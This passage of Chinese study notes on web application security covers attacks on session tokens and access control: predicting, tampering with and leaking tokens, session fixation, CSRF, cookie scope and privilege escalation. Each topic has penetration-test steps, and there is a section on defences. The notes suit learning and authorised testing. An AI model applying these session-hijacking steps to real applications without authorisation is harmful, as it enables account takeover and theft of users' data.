<li>无会话机制：将用户的状态数据保存在客户端，由用户在下一次请求的时候提交这些状态数据，没有保存在服务端，这样服务端就没有必要使用会话机制维护状态了；如果使用这种方式的话，就需要使用一个比较大的对象来存放状态信息了；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-26"><a href="#渗透测试步骤-26" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用排查法进行测试，看是否存在疑似令牌的数据；</li>
<li>如果存在以下现象，则说明应用程序很可能将会话状态保存在客户端，包括：向客户端发送的令牌数据比较大（如大于等于100B）、应用程序对每个请求做出响应后，发布一个新的类似令牌、数据似乎被加密（无法辨识其结构）或包含签名（由于有意义的结构和几个字节的无意义二进制数据组成）、应用程序拒绝通过多个请求提交相同数据的做法；</li>
<li>如果应用程序不使用会话令牌管理状态，则本章的所有攻击手段都没有效果，需要寻找其他方向的漏洞来进行渗透；</li>
</ul>
</blockquote>
<h2 id="会话令牌生成过程中的薄弱环节"><a href="#会话令牌生成过程中的薄弱环节" class="headerlink" title="会话令牌生成过程中的薄弱环节"></a>会话令牌生成过程中的薄弱环节</h2><p>使用令牌的一些场景</p>
<ul>
<li>发送到用户注册的电子邮件地址的密码恢复令牌；</li>
<li>存放在隐藏表单字段中的令牌，用于防止跨站点脚本攻击；</li>
<li>用于一次性访问受保护资源的令牌；</li>
<li>“记住我”功能使用的永久令牌；</li>
<li>未启用验证功能的购物应用程序，让用户可检查当前订单状态的令牌；</li>
</ul>
<h3 id="令牌有一定的含义"><a href="#令牌有一定的含义" class="headerlink" title="令牌有一定的含义"></a>令牌有一定的含义</h3><p>有些应用程序没有随机生成令牌，而是基于用户的个人信息来生成令牌；而用户的信息字段呈现某种多样性，有数字、字符串、邮件等；为了让信息的传输符合 HTML 的标准，应用程序先对信息进行编码，例如十六进制、Base64 等，这种方式通常会表现出某种结构，例如通常以分隔符隔开；另外，不同部分很可能使用不同的编码方式；</p>
<p>结构化的令牌的组成成分常包括以下几项：</p>
<ul>
<li>账户用户名、用户姓名中的名和姓、用户的电子邮件地址、用户的角色；</li>
<li>应用程序用来区分账户的数字标识符；</li>
<li>日期时间截；</li>
<li>一个递增或可预测的数字；</li>
<li>客户端的 IP 地址；</li>
</ul>
<p>虽然结构化令牌经常包含很大的数据量，但并不是每个请求都会使用里面的全部数据，每个请求经常只使用其中的一两个数据项；</p>
<blockquote>
<h4 id="渗透测试步骤-27"><a href="#渗透测试步骤-27" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>从应用程序获取一个令牌，每次修改其中的一个字节，然后重新发送，观察应用程序是否仍然正常响应；如果是的话，说明所修改的部分并未在请求处理过程中发挥作用，可以在接下来的分析中将其排除在外，以减轻分析的负担，提高效率；</li>
<li>在不同的时间，以不同的用户登录，记录服务器发布的令牌数据；</li>
<li>如果允许自我注册，注册一些非常相近的用户名并登录，观察返回的令牌的区别；</li>
<li>如果在登录阶段，有提交一些与用户相关的数据，对其进行系统化的修改，并记录登录后收到的令牌；</li>
<li>对令牌进行分析，查找任何与用户名或其他用户可控制的数据相关的内容；</li>
<li>查找令牌中任何明显的编码或模糊处理方案；常用的方案有 XOR、十六进制、Base64 等；</li>
<li>当对令牌数据的逆向工程取得有意义的结果时，尝试看能否猜测出应用程序最近向其他用户发布的令牌，在一个使用令牌才能显示令牌的页面，发送大量的请求，对猜测结果进行测试；</li>
</ul>
</blockquote>
<h3 id="令牌可预测"><a href="#令牌可预测" class="headerlink" title="令牌可预测"></a>令牌可预测</h3><p>有时候令牌中并不包含任何与用户有关的数据，但是令牌的生成本身具有的一定的顺序规律性，因此可以尝试猜测其他可能存在的有效令牌，并发送大量请求进行验证；这种方法的成功率比较低，可能只有千分之一，但是由于可以使用自动化的工具，在短时间内发送大量的请求进行验证（例如验证响应的长度即可区分有效和无效的请求），因此它也能够在短时间内找到很多有效的令牌；</p>
<p>可预测的会话令牌通常源于三点：</p>
<ul>
<li>隐含序列；</li>
<li>时间依赖；</li>
<li>生成的数字随机性不强；</li>
</ul>
<h4 id="隐含序列"><a href="#隐含序列" class="headerlink" title="隐含序列"></a>隐含序列</h4><p>有时候序列并不是一眼就可以发现的，需要在第一轮的解码后，再做第二轮的算术处理<br>例如第二个值减去第一个值，之后就会暴露出其中隐藏的模式出来；</p>
<h4 id="时间依赖"><a href="#时间依赖" class="headerlink" title="时间依赖"></a>时间依赖</h4><p>有些令牌的生成跟时间有关（一般会呈现递增规律），虽然以毫秒进行计算得到的随机值很大，但是攻击者可以每隔一小段时间就获取令牌，当发现跳跃的时候，很可能是应用程序给一个刚登录的用户生成了令牌，由于攻击者拥有该跳跃前和跳跃后的令牌数据，因此可以大大缩小枚举的范围，通过不断发请求进行尝试，获得用户的有效令牌；攻击者可以使用这个方法一直枚举有效令牌，直至等到管理员登录，届时将直接获得管理员的权限；</p>
<h4 id="生成的数字随机性不强"><a href="#生成的数字随机性不强" class="headerlink" title="生成的数字随机性不强"></a>生成的数字随机性不强</h4><p>计算机生成的随机数基本上都是伪随机的，它其实是有规律的，差别在于开发者如何去除它的规律性，如果开发者使用成熟框架的默认函数，则去除的办法相当于被公开了，那么攻击者在获得一个令牌后，就可以推测出下一个令牌的值，甚至之前所有令牌的值；</p>
<h4 id="测试随机性强度"><a href="#测试随机性强度" class="headerlink" title="测试随机性强度"></a>测试随机性强度</h4><p>如果收集了足够多的令牌样本后，就可以使用统计方法来判断令牌是否具备随机性；它的基本理念是在大量令牌中判断某些特殊点的出现次数，看它是随机分布的，还是具备一定的规律性；Burp Sequencer 即是一个现成的判断随机性的工具；</p>
<h5 id="两个注意事项："><a href="#两个注意事项：" class="headerlink" title="两个注意事项："></a>两个注意事项：</h5><ul>
<li>即使是按照既定算法计算的结果，也是有可能通过随机性测试的，此时并不代表这个令牌没有漏洞，在了解了算法和生成器的内部状态后，就可以非常准确的正向或者逆向推断出它的输出；</li>
<li>没有通过随机机测试的令牌，也不能保证它一定可以被逆向工程；因为部分数据位出现非随机性，不代表整个序列可以被预测；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-28"><a href="#渗透测试步骤-28" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>遍历整个应用程序，观察它是在什么场景下发布新令牌的；一般来说有两种常见的场景会发令牌，一种是登录后，一种是在请求中没有发现令牌的时候；只要找到了这个场景，才能够大量的收集令牌；</li>
<li>使用 Burp Suite 中的 Burp Sequencer 功能对令牌进行实时补获，以便尽可能多的收集令牌，避免错失应用程序给那些真正的用户发布的令牌，同时这样也可以降低对时序的依赖；</li>
<li>如果应用程序使用商业会话管理机制，或者可以本地访问应用程序，则可以在受控的条件下收集无数的令牌；</li>
<li>在 Burp 收集令牌的同时，打开“自动分析”的功能；先至少收集500个令牌，然后详细审查分析结果；即使令牌中有足够的数据位通过了测试，也继续尽可能长时间的收集令牌，并在审查分析结果；</li>
<li>如果令牌未通过随机性测试，并且似乎包含某种模式可用于预测，此时需要更换一个 IP 地址，使用不同的用户名重新开始收集操作；因为令牌有可能使用用户名或者用户的 IP 地址作为令牌生成的参数；</li>
<li>如果攻击者对令牌的生成算法有了把握，接下来最好的办法是使用一段定制的脚本来实施攻击，因为它能够使用观测到的模式来生成令牌，并用上相应的编码技巧；</li>
<li>如果可以查看源代码，则应仔细检查负责生成令牌的代码，了解它使用的机制，并确定是否能够轻易的预测该令牌；</li>
<li>如果确定可以从应用程序数据中的熵实施蛮力攻击，则需要预估一下需要发起的具体请求数；</li>
</ul>
</blockquote>
<h3 id="加密令牌"><a href="#加密令牌" class="headerlink" title="加密令牌"></a>加密令牌</h3><p>有些应用程序在令牌中包含有意义的信息，并对这些进行加密；根据所使用的不同加密算法，这种做法可能是有漏洞的；</p>
<h4 id="ECB-密码"><a href="#ECB-密码" class="headerlink" title="ECB 密码"></a>ECB 密码</h4><p>ECB 指电子密码本，它经常被一些对称加密算法所使用；它的缺点是明文与密文存在相似的模式，例如相同的分组方法；</p>
<p>由于令牌中的内容不一定会被应用程序全部使用，因此通过更改和拼接分组的内容，可能会导致出现用户伪装的漏洞；</p>
<h4 id="CBC-密码"><a href="#CBC-密码" class="headerlink" title="CBC 密码"></a>CBC 密码</h4><p>CBC 表示密码块链，它的出现是为了解决 ECB 存在的漏洞问题，即在将某段明文转换成密文之前，先把它与上一个密文块做 XOR 运算，之后再转换成密文；这样就可以避免 ECB 中存在的分组漏洞问题了；</p>
<p>但是这种方式也引入了新的漏洞，因为攻击者可以让每次请求只修改令牌中的一个字符，虽然更改后的令牌被解密的时候，相应的字段会变成乱码，但由于该段的值会被用做上一段的 XOR 运算输入，即使是乱码值，也有可能生成有意义的 XOR 运算结果；那么，当应用程序没有判断所有字段内容进行令牌有效性判断的话，只读取其中某个字段的值，那么攻击者将有可能伪装成功；</p>
<p>Burp Intruder 中的 bit flipper（位翻转程序）即可以用来测试令牌是否有这方面的漏洞；位翻转对数字类型的值的效果比较好，对文本类型的效果比较差；</p>
<p>当应用程序在令牌中使用某种对称性加密算法时，如果应用程序的其他功能也需要使用加密算法时，很有可能它们会使用同一个对称加密算法，此时如果能在应用程序的其他功能获得某个加密值的源值（例如通过受控账户控制输入值），则可以利用这个信息完全解密任何受保护的信息；</p>
<blockquote>
<h4 id="渗透测试步骤-29"><a href="#渗透测试步骤-29" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果会话令牌没有明显的意义，或者本身是连续的，那么令牌很有可能是被加密的；</li>
<li>通过注册几个不同的用户名，每次为用户名多添加一个字符，如果添加一个字符会让令牌的长度增加8或16个字节，则说明应用程序可能使用的是分组密码；此时可以再注册一个添加一个字符的用户名，看是否同样的增加了8或16个字节；</li>
<li>可尝试通过移动令牌中的密文分组进行登录，看应用程序如何反应；</li>
<li>可尝试使用位翻转令牌中有效的荷载源来访问应用程序，如果翻转后应用程序仍然能否正常使用，那么可以扩大范围，对这个部分中的每个值进行测试，以找到更有针对性的攻击方法；</li>
<li>在前述的两种攻击方法中，注意监控应用程序的反应，确定响应中的用户信息是否出现变化；如果有的话，可使用这种方法来尝试提升权限；</li>
<li>在通过增加单个字符来获取更长的令牌的时候，通过反复不断增加字符，最后可以达到应用程序所使用的分组大小，这样就增加了分组边界对齐的概率；然后，对于不同用户名生成的一系列令牌，使用前面两种操作（移动或者翻转）进行尝试</li>
</ul>
</blockquote>
<h2 id="会话令牌处理中的薄弱环节"><a href="#会话令牌处理中的薄弱环节" class="headerlink" title="会话令牌处理中的薄弱环节"></a>会话令牌处理中的薄弱环节</h2><h3 id="在网络上泄露令牌"><a href="#在网络上泄露令牌" class="headerlink" title="在网络上泄露令牌"></a>在网络上泄露令牌</h3><ul>
<li>当令牌使用非加密方式在网络上传输时，就有可能导致令牌泄露；之后窃听者并不需要破解令牌，只需要使用获得的令牌就可以伪装成其他用户进行登录了（由于还能够截获其他机密信息，理论上窃听者都可以使用密码自行登录，但有时候为了尽量保持隐秘，有可能没这么做）；</li>
<li>有些应用程序在用户初始打开页面的时候，就给用户发了令牌，但是此时却是使用 HTTP 传输，之后等用户登录的时候才转成 HTTPS，并且在用户登录后没有给用户发送新令牌；即使在用户登录后使用新令牌，如果此时用户点击了应用程序中那些不需要验证的页面，转成了 HTTP 传输，此时将直接造成令牌泄露；</li>
<li>有些应用程序对所有静态资源使用 HTTP，如果此时用户已经在之前的页面完成了验证，则将使得令牌泄露；</li>
<li>即使应用在所有页面都使用了 HTTPS 传输，如果攻击者有方法诱使用户发送一个 HTTP 请求，即可以获得这个令牌；（攻击者一般可以通过在电子邮件中或即时消息中给用户发送一个 URL，并在他控制的一个 Web 站点中插入一个自动加载的链接即可完成相应的目的）；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-30"><a href="#渗透测试步骤-30" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>以正常方式访问应用程序，进行登录，然后访问应用程序的每一个功能，记录每一个被访问的 URL 以及收到新会话令牌的每种场合；特别注意 HTTP 和 HTTPS 进行切换的场景；可使用网络嗅探器或使用代理服务器中的日志自动化完成这一个工作；</li>
<li>如果应用程序使用 HTTP cookie 来传送会话令牌，此时应注意是否启用 secure 字段，如果没启用的话，则令牌是通过非加密连接传送的，很容易可以实现拦截；</li>
<li>如果初始使用 HTTP，在登录后切换到 HTTPS，确定一下是否有发布新令牌，以及在 HTTP 阶段的令牌是否仍然可用；并且尝试再切换回 HTTP 的页面时，应用程序是否仍然可以访问；</li>
<li>即使应用程序在每一个页面都使用 HTTPS，确认一下服务器是否监听 80 端口，如果是的话，直接使用验证后的会话令牌访问所有的 HTTP URL，确认会话令牌是否被传送；如果有传送，确认下是否依然有效；</li>
</ul>
</blockquote>
<h3 id="在日志中泄露令牌"><a href="#在日志中泄露令牌" class="headerlink" title="在日志中泄露令牌"></a>在日志中泄露令牌</h3><p>很多应用程序会为管理员或运营人员提供监控应用状态的功能，这些功能有时会访问应用程序的日志，当这些功能没有得到很好保护的时候，攻击者就有可能使用它来获得所有用户的令牌列表；</p>
<p>日志中之所以有会话令牌，其中一个重要的原因是有很多应用使用 URL 参数来传送令牌，而不是使用 cookie 或者 POST 请求；</p>
<p>处于 URL 参数中的令牌，将会在以下各种场景中被记录：</p>
<ul>
<li>用户浏览器的日志；</li>
<li>Web 服务器的日志；</li>
<li>企业或 ISP 代理服务器的日志；</li>
<li>任何在应用程序主机环境中采用的反向代理日志；</li>
<li>应用程序的用户，点击站外链接访问的任何服务器的 Referer 日志；</li>
</ul>
<blockquote>
<p>虽然 HTTPS 可以防止 URL 中的参数被日志记录，但是如果用户点击了页面中的站外链接，包含参数的完整 URL 将会出现在站外链接服务器收到的消息头中的  Referer 字段中；</p>
</blockquote>
<blockquote>
<h4 id="渗透测试步骤-31"><a href="#渗透测试步骤-31" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>找出应用程序的所有功能（参见之前搜索隐藏链接的技巧），找出可以查看会话令牌的任何日志或监控功能；并查明认证可以访问这些功能；</li>
<li>找出应用程序中使用 URL 传送会话令牌的任何情况；即使应用程序在内部都使用安全的传输方式，但在访问外部系统时，有时会使用非安全的传输方式；</li>
<li>如果应用程序在 URL 中传送会话令牌，那么可以寻找一些允许用户自动上传内容的功能，使用这些功能，上传包含站外链接的内容，链接至自己搭建的服务器，等待一段时间，查看日志中的 Referer 字段是否收到任何用户的会话令牌；</li>
<li>如果截获到任何会话令牌，通过拦截服务器的下一个响应，使用截获的 cookie 值添加自己的 Set-Cookie 消息头，来实现切换用户的目的；在 Burp 中，可以使用一个 Suite 范围的配置，在所有指向目标应用程序的请求中设置一个特殊的 cookie，以便在测试期间可以在不同的用户之间快速轻松切换；</li>
<li>如果截获大量的令牌，并且通过截获的令牌可以访问用户的敏感数据，就能通过自动化工具获得大量的其他用户的数据；</li>
</ul>
</blockquote>
<h3 id="令牌-会话映射易受攻击"><a href="#令牌-会话映射易受攻击" class="headerlink" title="令牌-会话映射易受攻击"></a>令牌-会话映射易受攻击</h3><p>理想的会话管理机制中，不应该允许同一名用户拥有多个会话，因为这样有很多安全的隐患，例如攻击者利用会话进行连接却不会被发现；</p>
<p>有些应用程序使用静态的会话令牌，这种情况更加糟糕，因为它完全无法判断是否同时存在多个会话，而且令牌永远有效，一旦泄露，更改密码也没有用；</p>
<p>有些应用程序使用用户名+1个随机值来生成令牌，这种机制生成出来的令牌看似随机，但其实跟静态会话可能没有什么两样，因为只要随机值是有效的，这个令牌就自然生效了，完全不需要验证；</p>
<blockquote>
<h4 id="渗透测试步骤-32"><a href="#渗透测试步骤-32" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用相同的用户账户不同的浏览器或计算机先后登录应用程序，确定这两个会话是否会都处于活动的状态，如果是的话，表示应用程序并行会话；这样截获其他用户令牌的攻击不会有被检测出来的风险；</li>
<li>用相同的账户，在不同的浏览器先后登录并退出系统，比对每次收到的令牌是一样的，还是不同的；如果都一样，说明令牌是静态的，有严重的设计缺陷；</li>
<li>如果令牌包含某有结构和意义，尝试将其他与用户有关的部分隔离出来，单独修改该部分的值，让它指向另外一个用户，确定修改后的令牌是否能否正常使用，以及能否伪装成其他用户；</li>
</ul>
</blockquote>
<h3 id="会话终止易受攻击"><a href="#会话终止易受攻击" class="headerlink" title="会话终止易受攻击"></a>会话终止易受攻击</h3><p>让会话的生命周期尽量短有两个好处：</p>
<ul>
<li>一是可以避免攻击者利用被截获的令牌；</li>
<li>二是可以避免用户使用共享计算机时出现的危险；</li>
</ul>
<p>有些应用程序设计得很糟糕，要么完全没有让用户自行终止会话的行为，要么即使有也并没有真正的执行；</p>
<blockquote>
<h4 id="渗透测试步骤-33"><a href="#渗透测试步骤-33" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>通过以下方式检查服务端是否执行了终止会话的操作：登录获取一个有效令牌，每间隔一段时间访问一下需要该令牌才能访问的页面，看应用程序是否返回正确的响应（可在自动化工具中设置好时间间隔）；</li>
<li>查找一下是否有退出的功能，如果没有，意味着用户无法主动终止会话，存在被攻击的隐患；</li>
<li>如果有退出的功能，在退出后，测试一下原来的令牌是否能够有效，如果有效，表示这是一个假退出；</li>
</ul>
</blockquote>
<h3 id="客户端暴露在令牌劫持风险之中"><a href="#客户端暴露在令牌劫持风险之中" class="headerlink" title="客户端暴露在令牌劫持风险之中"></a>客户端暴露在令牌劫持风险之中</h3><p>保存在客户端的令牌有可能存在被窃取的风险，例如使用跨站点脚本、或者固定令牌伪装；</p>
<blockquote>
<h4 id="渗透测试步骤-34"><a href="#渗透测试步骤-34" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确认应用程序中是否存在跨站点脚本漏洞，看是否可以利用这些漏洞截获其他用户的令牌；</li>
<li>如果应用程序在用户登录前就发令牌，并且登录后仍沿用该令牌，则说明容易受到固定会话攻击；</li>
<li>即使应用程序在用户未登录前没有发令牌，而只是在登录后发令牌，如果在登录后，应用程序允许用户返回登录前的那个页面，这意味着用户很可能可以使用已获得的有效令牌，然后用另外一个用户名登录；如果在登录后，应用程序没有发一个新令牌，那么存在固定会话攻击的漏洞；</li>
<li>确定应用程序会话令牌的格式；用一个格式有效的伪造令牌尝试进行登录，如果应用程序允许使用一个捏造的令牌建立一个通过验证的会话，那么存在固定会话漏洞；</li>
<li>如果应用程序完全依靠 HTTP cookie 传送会话令牌，有可能容易受到跨站点请求伪造（CSRF）的攻击；先登录应用程序，然后在同一个浏览器进程中，在其他站点页面向先应用程序发送一个请求，确认它是否会提交用户的令牌；可利用这个缺陷执行目标用户权限下的一些操作（攻击者需要先确定好相关敏感功能所需要提交的各项参数）；</li>
</ul>
</blockquote>
<h3 id="宽泛的-cookie-范围"><a href="#宽泛的-cookie-范围" class="headerlink" title="宽泛的 cookie 范围"></a>宽泛的 cookie 范围</h3><p>根据 HTTP 协议，服务器在 Set-Cookie 字段中，还可以使用 domain 和 path 两个字段来告知浏览器该 cookie 适用的域名和路径；</p>
<h4 id="cookie-域限制"><a href="#cookie-域限制" class="headerlink" title="cookie 域限制"></a>cookie 域限制</h4><p>如果没有指定 domain 的值，cookie 默认仅适用于当前域及其子域，不包含父域或者兄弟域；</p>
<p>如果服务端在指定 domain 值的时候，设置得过于宽泛，例如 abc.com 之类的根域名，这意味着该 cookie 将在根域名下的任何子域名中都有效；那么任何一个子域名页面，都有机会收集原本属于其他子域名的 cookie；</p>
<p>由于基于域的 cookie 隔离没有同源策略那么严格，当一个应用程序和另外一个漏洞应用程序共享同一个根域名，而只是通过端口号或者协议来区别彼此的时候，攻击者将有机会利用这种漏洞通过一个应用程序获取另一个应用程序的 cookie；</p>
<blockquote>
<h4 id="渗透测试步骤-35"><a href="#渗透测试步骤-35" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序将 cookie 范围放宽到父域，将容易受到通过兄弟域名下的其他应用程序实施的攻击；</li>
<li>如果应用程序使用 domain 的默认值，或者将其设置为当前域名，则子域仍然可以访问 cookie；</li>
<li>确定一个应用程序的所有子域名，如果子域名下有其他应用程序，尝试通过他们获取当前应用程序的 cookie</li>
</ul>
</blockquote>
<h4 id="cookie-路径限制"><a href="#cookie-路径限制" class="headerlink" title="cookie 路径限制"></a>cookie 路径限制</h4><p>HTTP 协议支持对 cookie 的作用路径进行指定，默认也是当前路径及其下的子路径；但如果开发者扩大了路径范围，将使得父级路径和兄弟路径的不可信程序有机会控制应用程序；</p>
<h2 id="保障会话管理的安全"><a href="#保障会话管理的安全" class="headerlink" title="保障会话管理的安全"></a>保障会话管理的安全</h2><h3 id="生成强大的令牌"><a href="#生成强大的令牌" class="headerlink" title="生成强大的令牌"></a>生成强大的令牌</h3><p>有效的令牌生成机制应该具备以下两个特点：</p>
<ul>
<li>使用数量极其庞大的一组可能值；取值范围应大到让攻击者在令牌有效期无法通过蛮力猜测破解；</li>
<li>包含强大的伪随机源，确保令牌值以无法预测的方式平均分布在取值范围中；</li>
</ul>
<p>令牌中不应该保存任何有意义的数据，整个会话对象应该保存在服务端；</p>
<p>谨慎选择随机数算法，确保它是不可预测的；当然这也是要付出代价的，越不容易猜测的随机数，意味着计算它的时间越久，使得应用程序的响应越慢；</p>
<p>除了选择最为稳定可靠的随机数算法外，在生成令牌的过程中，加入一些额外的令牌（如访问者 IP，请求的时间截）作为熵源，也是一种良好的作法；</p>
<h3 id="在整个生命周期保障令牌的安全"><a href="#在整个生命周期保障令牌的安全" class="headerlink" title="在整个生命周期保障令牌的安全"></a>在整个生命周期保障令牌的安全</h3><ul>
<li>令牌只能使用 HTTPS 传送；</li>
<li>绝不能在 URL 中传送会话令牌；</li>
<li>总是执行退出功能，删除服务器上的所有会话资源并终止会话令牌；</li>
<li>会话处于非活动状态一段时间后（如10分钟），应执行会话终止；</li>
<li>防止并行登录；每次登录都发布一个新的令牌，同时终止删除现有用户的所有会话；如果旧令牌不能马上删除的话，如果有用户使用旧令牌尝试登录，应给用户发出警报，告知有在其他设备尝试登录；</li>
<li>尽可能限定会话 cookie 的域和路径范围，留意框架或 Web 服务器软件的默认配置；</li>
<li>应严格审查应用程序的源代码，避免存在任何形式的跨站点脚本漏洞；</li>
<li>如果有用户提交服务器不认可的令牌，应立即在浏览器删除该令牌，并将用户返回到应用程序的起始页面；</li>
<li>在执行转账之类的重要操作前，应进行两步确认或重新验证，以便有效防御跨站点请求伪造和其他会话攻击；</li>
<li>跨站点请求伪造攻击之所以可行，其中一个原因在于应用程序可能完全依赖 cookie 来传送令牌，如果应用程序不完全依赖 cookie 传送令牌，例如同时使用每页面令牌，则可以防御跨站点的请求伪造；</li>
<li>成功登录验证后，应总是建立一个新会话，以避免固定会话攻击的影响；如果有无须登录即可提交敏感数据的功能，则不应该在页面上面显示敏感数据，应进行部分隐藏处理；</li>
</ul>
<blockquote>
<p>每页面令牌：除了会话令牌，增加一个每页面令牌，当用户请求一个页面时，生成一个新令牌放在隐藏表单字段中；当用户在该页面发起新请求时，除了验证主令牌外，还验证页面令牌，如果不匹配，整个会话将终止；</p>
</blockquote>
<h3 id="日志、监控与警报"><a href="#日志、监控与警报" class="headerlink" title="日志、监控与警报"></a>日志、监控与警报</h3><p>会话功能应该与日志和警报功能紧密结合，以帮助管理在必要时采取防御措施；</p>
<ul>
<li>应用程序应监控包含无效令牌的请求；</li>
<li>如果收到大量包含无效令牌的请求，可将其 IP 屏蔽一段时间；</li>
<li>在日志中保留针对会话攻击的记录，有助于管理员对攻击进行调查；</li>
<li>只要有可能，应向用户警报与会话相关的反常事件，例如并行登录、以便促使用户进行检查；</li>
</ul>
<p>反应性会话终止：当收到一些显然不可能由普通用户提交的请求时，应该迅速终止会话，以便延长攻击者的探查时间；</p>
<h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>现实世界中的会话管理机制通常存在很多漏洞，并且会成为攻击者的重点目标，因为如果能够攻破管理员的会话，往往能够攻破整个应用程序；耐心与不懈往往是完成攻克的最大利器；虽然解译看似随机生成的令牌费时又费力，但是它通常可以获得巨大的回报；</p>
<h1 id="8-攻击访问控制"><a href="#8-攻击访问控制" class="headerlink" title="8. 攻击访问控制"></a>8. 攻击访问控制</h1><h2 id="常见漏洞-1"><a href="#常见漏洞-1" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><h3 id="完全不受保护的功能"><a href="#完全不受保护的功能" class="headerlink" title="完全不受保护的功能"></a>完全不受保护的功能</h3><p>有些敏感功能在应用程序中使用隐藏的、没有任何访问控制的 URL 来访问，这是非常危险的，因为 URL 可能出现在任何日志中，浏览器的记录、页面 JS 代码和注释等；</p>
<p>直接访问的方法：某些应用程序会将服务器某个对象的方法前移到客户端组件中，由客户端的代码直接调用，此时有可能存在漏洞，例如用户本来只能某个方法，但现在却将对象的所有方法全部暴露了；</p>
<h3 id="基于标识符的功能"><a href="#基于标识符的功能" class="headerlink" title="基于标识符的功能"></a>基于标识符的功能</h3><p>服务端的资源经常使用标识符进行访问，有些应用程序会将标识符直接放在请求的 URL 参数中，当标识符很容易被猜测的时候，就很容易被未授权访问；</p>
<p>在某些单页面应用中，不仅资源会使用标识符，连功能都有可能使用标识符，此时如果攻击者发现这些 URL，就可以像拥有高级权限的一样访问它们；</p>
<h3 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h3><p>开发者经常会假设访问第二个阶段的用户一定是通过了第一阶段的验证，但其实不然；攻击者可以利用这个漏洞，直接访问第二个阶段的功能；</p>
<h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>有些应用程序的静态文件是由 Web 服务器软件管理的，因此它很可能并没有任何的访问控制，只需要有一个 URL 就可以进行访问了；</p>
<p>这些静态文件包括图片、书籍、报告、二进制代码，甚至有时还会有日志文件；</p>
<h3 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h3><p>有些应用程序使用第三方的控件平台来实现访问控制，平台的配置类似防火墙规则的配置，一般基于 HTTP 请求方法、URL路径、用户角色等三个条件实现控制；但是有时开发者会存在规则配置错误的情况，没有完整详细的进行设置，导致可能出现漏洞；</p>
<h3 id="访问控制方法不安全"><a href="#访问控制方法不安全" class="headerlink" title="访问控制方法不安全"></a>访问控制方法不安全</h3><p>还有一些奇葩的应用程序会使用客户端提交的参数来做出访问控制；</p>
<ul>
<li>基于参数的访问控制：例如在参数中指明当前用户是否为管理员；</li>
<li>基于 Referer 的访问控制：有些应用程序基于请求中的 Referer 字段值来控制权限，例如来源于管理页面的请求即表示拥有管理员权限；</li>
<li>基于位置的访问控制：例如基于 IP 地址的地理位置，但是这种方 式很容易被绕过，例如使用代理服务器、VPN、移动设备；</li>
</ul>
<h2 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h2><p>在开始探查访问控制漏洞之前，应先就应用程序现有的响应结果进行分析，之后再有针对性的实施探查；</p>
<blockquote>
<h4 id="渗透测试步骤-36"><a href="#渗透测试步骤-36" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>应用程序是否允许用户访问属于他们的特定数据；</li>
<li>是否存在各种级别的用户，应用程序允许他们访问不同的功能；</li>
<li>管理员使用的功能是否也内置在应用程序中；</li>
<li>分析应用程序的哪些功能或资源最有可能帮助攻击者提升当前的权限；</li>
<li>是否存在任何的标识符（以 POST 消息体或 URL 参数的方式），表明其使用某一参数来控制访问级别；</li>
</ul>
</blockquote>
<h3 id="使用不同用户账户进行测试"><a href="#使用不同用户账户进行测试" class="headerlink" title="使用不同用户账户进行测试"></a>使用不同用户账户进行测试</h3><blockquote>
<h4 id="渗透测试步骤-37"><a href="#渗透测试步骤-37" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>功能的访问控制：首先使用一个权限较高的账户确认所有可用的功能，然后使用一个权限较低的账户访问这些功能，测试能否垂直提升权限；</li>
<li>资源的访问控制：首先使用一个用户确认当前用户可访问而其他用户无法访问的资源，然后尝试使用另外一个账户来访问这些资源，测试能否水平提升权限（请求相关的 URL 或提交相同的 POST 参数）；</li>
</ul>
</blockquote>
<p>Burp Suite 提供使用两个不同的账户来解析应用程序的访问权限控制的功能，可以大大的提高效率；</p>
<blockquote>
<h4 id="渗透测试步骤-38"><a href="#渗透测试步骤-38" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用 A 账户正常访问应用程序的所有功能，记录下站点地图；</li>
<li>使用 B 账户访问站点地图中的所有功能，比对结果；</li>
<li>自动化工具此处只能用来收集信息，无法用于判断漏洞是否存在，需要结合应用程序功能访问的信息，才能进一步判断；</li>
</ul>
</blockquote>
<h3 id="测试多阶段过程"><a href="#测试多阶段过程" class="headerlink" title="测试多阶段过程"></a>测试多阶段过程</h3><p>多阶段过程由于每个阶段之间存在一定的逻辑顺序关系，经常涉及很多请求，此时需要对过程中的每一个步骤都进行单独的测试，才能判断漏洞是否存在；</p>
<blockquote>
<h4 id="渗透测试步骤-39"><a href="#渗透测试步骤-39" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>在多阶段的过程中，对客户端发给服务端的每个请求，都进行单独的测试，确保每个请求都实施了正确的访问控制；</li>
<li>尝试使用低权限的账户到达某个阶段位置，检测是否可以实施权限提升的攻击；</li>
<li>使用高权限用户完成整个过程，记录下浏览器中的每个请求，之后使用权限较低的用户账号，对于保存的记录再次发起请求，看是否被应用程序允许；</li>
</ul>
</blockquote>
<p>Burp 有个工具可以保存每次请求的上下文，然后可以生成一个自己的 URL，只要在浏览器中输入该 URL，Burp 就会调用保存的上下文，然后重要发送请求；</p>
